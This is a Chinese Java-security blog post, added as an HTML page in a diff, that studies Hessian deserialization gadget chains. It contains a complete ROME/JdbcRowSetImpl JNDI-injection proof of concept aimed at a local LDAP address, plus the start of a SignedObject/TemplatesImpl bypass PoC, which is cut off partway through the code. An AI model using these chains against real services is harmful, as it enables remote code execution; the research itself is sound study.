@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+
+
+<html theme="dark" showBanner="true" hasBanner="desktop" > 
+<link href="/fontawesome/css/fontawesome.css" rel="stylesheet">
+<link href="/fontawesome/css/brands.css" rel="stylesheet">
+<link href="/fontawesome/css/solid.css" rel="stylesheet">
+<script src="/js/color.global.min.js" ></script>
+<script src="/js/load-settings.js" ></script>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>关于Hessian链的探究 | F4miti0n&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="前置知识 RPC协议 和之前学过的RMI协议有相似之处，都是用于实现远程调用的协议，类似于API调用的封装协议。不同的地方在于信息传输过程中对于所传递信息的编码处理上。RPC客户端在传递过程中首先会组织一个请求消息，包含了要调用的远程方法的名称、参数等信息。然后，根据RPC协议的规定，将这些信息按照特定的二进制格式进行编码。当RPC服务端收到传递信息之后，再根据RPC协议规定进行解码还原。 除了在">
+<meta property="og:type" content="article">
+<meta property="og:title" content="关于Hessian链的探究">
+<meta property="og:url" content="http://example.com/2023/08/29/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="F4miti0n&#39;s Blog">
+<meta property="og:description" content="前置知识 RPC协议 和之前学过的RMI协议有相似之处，都是用于实现远程调用的协议，类似于API调用的封装协议。不同的地方在于信息传输过程中对于所传递信息的编码处理上。RPC客户端在传递过程中首先会组织一个请求消息，包含了要调用的远程方法的名称、参数等信息。然后，根据RPC协议的规定，将这些信息按照特定的二进制格式进行编码。当RPC服务端收到传递信息之后，再根据RPC协议规定进行解码还原。 除了在">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/cover7.jpg">
+<meta property="article:published_time" content="2023-08-29T06:50:08.000Z">
+<meta property="article:modified_time" content="2023-08-29T16:37:56.360Z">
+<meta property="article:author" content="F4miti0n">
+<meta property="article:tag" content="Java安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/cover7.jpg">
+  
+    <link rel="alternate" href="/atom.xml" title="F4miti0n's Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-32.png" sizes="32x32">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-128.png" sizes="128x128">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-180.png" sizes="180x180">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-192.png" sizes="192x192">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-32.png" sizes="32x32">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-128.png" sizes="128x128">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-180.png" sizes="180x180">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-192.png" sizes="192x192">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  
+  
+    
+<div id="banner" class="">
+  <img src="/images/banner.png" itemprop="image">
+  <div id="banner-dim"></div>
+</div>
+ 
+   
+  <div id="main-grid" class="shadow   ">
+    <div id="nav" class=""  >
+      <navbar id="navbar">
+  <nav id="title-nav">
+    <a href="/">
+      <div id="vivia-logo">
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+      </div>
+      <div>F4miti0n's Blog </div>
+    </a>
+  </nav>
+  <nav id="main-nav">
+    
+      <a class="main-nav-link" href="/">Home</a>
+    
+      <a class="main-nav-link" href="/archives">Archives</a>
+    
+      <a class="main-nav-link" href="/about">About</a>
+    
+  </nav>
+  <nav id="sub-nav">
+    <a id="theme-btn" class="nav-icon">
+      <span class="material-symbols-rounded light-mode-icon">wb_sunny</span>
+      <span class="material-symbols-rounded dark-mode-icon">dark_mode</span>
+    </a>
+    
+      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS Feed">
+        <span class="material-symbols-rounded rss">rss_feed</span>
+      </a>
+    
+    <a id="nav-search-btn" class="nav-icon" title="Search" style="display: none;">
+      <span class="material-symbols-rounded">search</span>
+    </a>
+    <div id="nav-menu-btn" class="nav-icon">
+      <span class="material-symbols-rounded">menu</span>
+    </div>
+  </nav>
+</navbar>
+<div id="nav-dropdown" class="hidden">
+  <div id="dropdown-link-list">
+    
+      <a class="nav-dropdown-link" href="/">Home</a>
+    
+      <a class="nav-dropdown-link" href="/archives">Archives</a>
+    
+      <a class="nav-dropdown-link" href="/about">About</a>
+    
+    
+      <a class="nav-dropdown-link" href="/atom.xml" title="RSS Feed">RSS</a>
+     
+    </div>
+</div>
+<script>
+  let dropdownBtn = document.getElementById("nav-menu-btn");
+  let dropdownEle = document.getElementById("nav-dropdown");
+  dropdownBtn.onclick = function() {
+    dropdownEle.classList.toggle("hidden");
+  }
+</script>
+    </div>
+    <div id="sidebar-wrapper">
+      <sidebar id="sidebar">
+  
+    <div class="widget-wrap">
+  <div class="info-card">
+    <div class="avatar">
+      
+        <img src="/images/avatar.png" alt="avatar">
+      
+      <div class="img-dim"></div>
+    </div>
+    <div class="info">
+      <div class="username">F4miti0n </div>
+      <div class="dot"></div>
+      <div class="subtitle">每天都在对抗无趣的生活 </div>
+      <div class="link-list">
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://twitter.com" title="Twitter"><i class="fa-brands fa-twitter"></i></a>
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://store.steampowered.com" title="Steam"><i class="fa-brands fa-steam"></i></a>
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com" title="GitHub"><i class="fa-brands fa-github"></i></a>
+         
+      </div>  
+    </div>
+  </div>
+</div>
+
+  
+  <div class="sticky">
+    
+      
+
+
+
+    
+      
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Tags</h3>
+      <ul class="widget-tag-list" itemprop="keywords"><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CTF%E5%A4%8D%E7%8E%B0/" rel="tag">CTF复现</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CTF%E6%80%BB%E7%BB%93/" rel="tag">CTF总结</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/HackTheBox/" rel="tag">HackTheBox</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Java%E5%AE%89%E5%85%A8/" rel="tag">Java安全</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E5%AE%89%E5%8D%93%E6%B8%97%E9%80%8F/" rel="tag">安卓渗透</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E9%97%B2%E8%B0%88/" rel="tag">闲谈</a></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Archives</h3>
+      
+      
+        <a class="archive-link" href="/archives/2024/03 ">
+          March 2024 
+          <div class="archive-count">1 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2024/02 ">
+          February 2024 
+          <div class="archive-count">2 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2024/01 ">
+          January 2024 
+          <div class="archive-count">1 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2023/11 ">
+          November 2023 
+          <div class="archive-count">1 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2023/10 ">
+          October 2023 
+          <div class="archive-count">3 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2023/09 ">
+          September 2023 
+          <div class="archive-count">6 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2023/08 ">
+          August 2023 
+          <div class="archive-count">7 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2023/07 ">
+          July 2023 
+          <div class="archive-count">1 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2023/05 ">
+          May 2023 
+          <div class="archive-count">3 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2023/04 ">
+          April 2023 
+          <div class="archive-count">2 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2023/03 ">
+          March 2023 
+          <div class="archive-count">1 </div>
+        </a>
+      
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Recent Posts</h3>
+      <ul>
+        
+          <a class="recent-link" href="/2024/03/10/RASPDemo/">
+            <div class="recent-link-text">
+              从零开始的RASP学习
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2024/02/26/Weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(%E4%B8%80)/">
+            <div class="recent-link-text">
+              Weblogic漏洞分析(一)
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2024/02/19/Jackson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20(%E4%B8%80)/">
+            <div class="recent-link-text">
+              Jackson漏洞分析 (一)
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2024/01/01/2023%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/">
+            <div class="recent-link-text">
+              关于2023的年度总结
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2023/11/05/Mysql%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/">
+            <div class="recent-link-text">
+              Mysql任意文件读取
+            </div>
+          </a>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+  </div>
+</sidebar>
+    </div>
+    <div id="content-body">
+       
+
+<article id="post-Hessian反序列化" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  
+    
+<div class="article-gallery">
+  <div class="article-gallery-photos">
+    
+      <a class="article-gallery-img" rel="gallery_cmljqmlrf000mm0wdbqlkbgxo">
+        <img src="/images/cover7.jpg" itemprop="image">
+      </a>
+    
+  </div>
+</div>
+
+   
+  <div class="article-inner">
+    <div class="article-main">
+      <header class="article-header">
+        
+<div class="main-title-bar">
+  <div class="main-title-dot"></div>
+  
+    
+      <h1 class="p-name article-title" itemprop="headline name">
+        关于Hessian链的探究
+      </h1>
+    
+  
+</div>
+
+        <div class='meta-info-bar'>
+          <div class="meta-info">
+  <time class="dt-published" datetime="2023-08-29T06:50:08.000Z" itemprop="datePublished">2023-08-29</time>
+</div>
+          <div class="need-seperator meta-info">
+            <div class="meta-cate-flex">
+  
+    Uncategorized 
+   
+</div>
+  
+          </div>
+          <div class="wordcount need-seperator meta-info">
+            1.6k words 
+          </div>
+        </div>
+        
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java%E5%AE%89%E5%85%A8/" rel="tag">Java安全</a></li></ul>
+
+      </header>
+      <div class="e-content article-entry" itemprop="articleBody">
+        
+          <h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><ul>
+<li>RPC协议<ul>
+<li>和之前学过的RMI协议有相似之处，都是用于实现远程调用的协议，类似于API调用的封装协议。不同的地方在于信息传输过程中对于所传递信息的编码处理上。RPC客户端在传递过程中首先会组织一个请求消息，包含了要调用的远程方法的名称、参数等信息。然后，根据RPC协议的规定，将这些信息按照特定的二进制格式进行编码。当RPC服务端收到传递信息之后，再根据RPC协议规定进行解码还原。</li>
+<li>除了在编码格式上存在差异以外，RPC协议与RMI协议在应用范围上也相差甚远。由于RPC协议使用 HTTP 或 TCP&#x2F;IP 等底层网络协议进行通信，所以RPC协议并不会如RMI协议一样收到语言的限制，不仅仅是Java中可以使用RPC协议，Python等语言同样可以使用RPC协议</li>
+</ul>
+</li>
+<li>Hessian协议<ul>
+<li>Hessian协议是RPC协议的一种具体的实现方式，是一种用于远程过程调用的二进制协议，通过紧凑的二进制格式实现高效的数据传输，同时具备跨平台的兼容性，适用于各种分布式系统和跨语言集成的场景。</li>
+</ul>
+</li>
+<li>Hessian反序列化器总结<br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Hessian%E9%93%BE/image-20220419213031319.png"></li>
+</ul>
+<h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>pom.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.caucho<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hessian<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.63<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h3><p>在我们挖反序列化洞的过程中，经常能碰见以HashMap为起点的gadget，诸如Fastjson、ROME、CC6、URLDNS等等。我们这里的Hessian反序列化也是同理，我们尝试着跟着MapDeserial#readMap看一看</p>
+<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Hessian%E9%93%BE/Pasted%20image%2020230829004706.png"></p>
+<p>能够清楚的看到，在末了会调用map.put这个方法，而在我们前面的gadget复盘里面，我们也早就知道了<code>map.put()</code>会对<code>key</code>进行 hashcode() 调用，也就是说我们只需要找到一个以hashcode为入口的链子搭配使用即可，这里附上之前复现的<code>rome</code>链进行参考</p>
+<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Hessian%E9%93%BE/Pasted%20image%2020230829003032.png"></p>
+<p>只需要把rome链粘贴过来就好哩，炒鸡简单，但这里因为Hessian反序列化自身特性的原因，我们不能直接把TemplatesImpl类加载这条简单链子作为RCE执行链，我们可以跟进看一下用Java原生反序列化和用Hessian反序列化在这里的差别</p>
+<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Hessian%E9%93%BE/VZATJ~V5ZSYT~8Z%29ZU0PG0X.png"><br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Hessian%E9%93%BE/4Y%28%25%5B3AMD3B%7BYAIVK%294Y4GL.png"></p>
+<p>可以清楚地看到，使用Hessian进行反序列化的对照组会因为<code>_tfactory</code>属性为null而在<code>TemplatesImpl#defineTransletClasses()</code>处中断执行，反之Java原生反序列化组则不存在相关问题，究其根本，是因为这里涉及到了一个关键字定义的问题，我们去审计一下TemplatesImpl这个类的源码看看。</p>
+<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Hessian%E9%93%BE/Pasted%20image%2020230829190928.png"></p>
+<p>能够看到，<code>TemplatesImpl</code>这里的<code>_tfactory</code>属性是被<code>transient</code>关键字所修饰的，这也就意味着在常规反序列化过程中，该属性的值无法与被序列化的原对象保持一致，但为什么Java原生反序列化中却又不存在这种置空现象？这里我们可以根进一下<code>TemplatesImpl#readObject()</code> 寻找答案。</p>
+<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Hessian%E9%93%BE/Pasted%20image%2020230829191636.png"></p>
+<p>可以看到，在line#266，TemplatesImpl自己就会给_tfactory赋值，压根不用担心置空问题。而当我们通过Hessian进行反序列化的时候，默认是不会调用gadget中类的readObject方法的，这才酿此大祸。这里我们换一条执行链，把类加载链改成经典的JdbcRowSetImpl链，但因为之前的文章一直没有详细复盘过JdbcRowSetImpl链，我们这里先进到JdbcRowSetImp里来盘一盘这条链子。</p>
+<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Hessian%E9%93%BE/Pasted%20image%2020230829192731.png"></p>
+<p>直接找lookup就能定位到<code>connect()</code>，因为这里的<code>getDataSourceName</code>返回值可以被我们任意控制，显然可以当做利用点，接着再查找用法，在<code>getDatabaseMetaData()</code> 这里找到了getter方法直接掉宝。</p>
+<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Hessian%E9%93%BE/Pasted%20image%2020230829193136.png"></p>
+<p>因为是jndi注入链，jdk版本限制会高一些，这里一开始就是忘换版本了，卡了一会儿。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RMI利用的JDK版本≤ JDK 6u132、7u122、8u113</span><br><span class="line">LADP利用JDK版本≤ 6u211 、7u201、8u191</span><br></pre></td></tr></table></figure>
+
+<p>这里换上万能的jdk66开搞，附上完整poc</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;  </span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;  </span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;  </span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;  </span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian_Test</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="type">byte</span>[] serialize(T o) <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(os);  </span><br><span class="line">        output.writeObject(o);   <span class="comment">//对象写在这  </span></span><br><span class="line">        output.close();  </span><br><span class="line">        System.out.println(os.toString());  </span><br><span class="line">        <span class="keyword">return</span> os.toByteArray();  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object arg)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);  </span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        f.set(obj, arg);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bai</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);  </span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(bai);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> input.readObject();  </span><br><span class="line">        <span class="keyword">return</span> (T) o;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">JdbcRowSetImpl</span> <span class="variable">jdbcRowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();  </span><br><span class="line">        jdbcRowSet.setDataSourceName(<span class="string">&quot;ldap://127.0.0.1:1389/bj56m8&quot;</span>);  </span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(JdbcRowSetImpl.class, jdbcRowSet);  </span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, toStringBean);  </span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();  </span><br><span class="line">        hashMap.put(objectBean, <span class="string">&quot;x&quot;</span>);  </span><br><span class="line">        setFieldValue(objectBean, <span class="string">&quot;_cloneableBean&quot;</span>, <span class="literal">null</span>);  </span><br><span class="line">        setFieldValue(objectBean, <span class="string">&quot;_toStringBean&quot;</span>, <span class="literal">null</span>);  </span><br><span class="line">        deserialize(serialize(hashMap));  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里顺便提一下<code>Hessian2Output()</code>，在这个方法内部会根据传来的序列化值的首字节进行反序列化器的选择，这里tag是77，选中的就是我们上文的<code>MapDeserializer</code>，运行结果如下</p>
+<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Hessian%E9%93%BE/Pasted%20image%2020230829210558.png"></p>
+<h3 id="关于TemplatesImpl链完善"><a href="#关于TemplatesImpl链完善" class="headerlink" title="关于TemplatesImpl链完善"></a>关于TemplatesImpl链完善</h3><p>本来以为TemplatesImpl链和Hessian已经没有缘分了，但后来查资料的时候看到了别的师傅用二次反序列化给绕过去了，这里也记录一下。</p>
+<p>ROME链调用SignedObject#getObject() –&gt;  ROME链调TemplateImpl链</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;  </span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;  </span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;  </span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;  </span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;  </span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.security.KeyPair;  </span><br><span class="line"><span class="keyword">import</span> java.security.KeyPairGenerator;  </span><br><span class="line"><span class="keyword">import</span> java.security.Signature;  </span><br><span class="line"><span class="keyword">import</span> java.security.SignedObject;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian_Test</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="type">byte</span>[] serialize(T o) <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(os);  </span><br><span class="line">        output.writeObject(o);   <span class="comment">//对象写在这  </span></span><br><span class="line">        output.close();  </span><br><span class="line">        System.out.println(os.toString());  </span><br><span class="line">        <span class="keyword">return</span> os.toByteArray();  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object arg)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);  </span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        f.set(obj, arg);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bai</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);  </span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(bai);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> input.readObject();  </span><br><span class="line">        <span class="keyword">return</span> (T) o;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="comment">//设置TemplatesImpl链作为ROME2的出口  </span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();  </span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;i&quot;</span>);  </span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span 